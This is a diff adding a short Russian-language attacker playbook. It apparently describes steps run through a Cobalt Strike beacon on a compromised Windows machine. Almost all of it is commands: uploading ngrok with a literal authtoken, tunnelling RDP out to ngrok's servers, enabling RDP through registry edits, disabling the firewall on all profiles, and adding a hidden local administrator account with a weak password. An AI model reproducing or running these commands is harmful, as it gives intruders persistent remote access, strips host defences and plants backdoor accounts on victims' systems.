@@ -1,0 +1,28 @@
+ Регистрируемся на https://ngrok.com/
+- Скачиваем ngrok.exe и загружаем на тачку
+
+В меню панели аккаунта ngrok выбираем "Your Authtoken"
+Копируем команду с токеном (без ./). Например:
+ngrok authtoken 1vZgA1BbLWyhSjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- Заходим в кобу на тачку и пишем:
+shell ngrok authtoken 1vZgA1BbLWyhSjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- Прокидываем туннель на РДП порт:
+shell ngrok tcp 3389
+
+- Открываем РДП на тачке:
+shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+shell NetSh Advfirewall set allprofiles state off
+
+shell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+shell netsh firewall set service type = remotedesktop mode = enable
+
+- Можем добавить отдельного пользователя под ngrok:
+shell net user Admin Password1 /add
+shell net localgroup Administrators Admin /add
+
+- Заходим в панель аккаунта ngrok - проверяем туннель ("Endpoints - Status").
+Копируем IP:port оттуда и идем в любой RDP-клиент. Подключаемся (можно и тем аккаунтом, что мы создали).
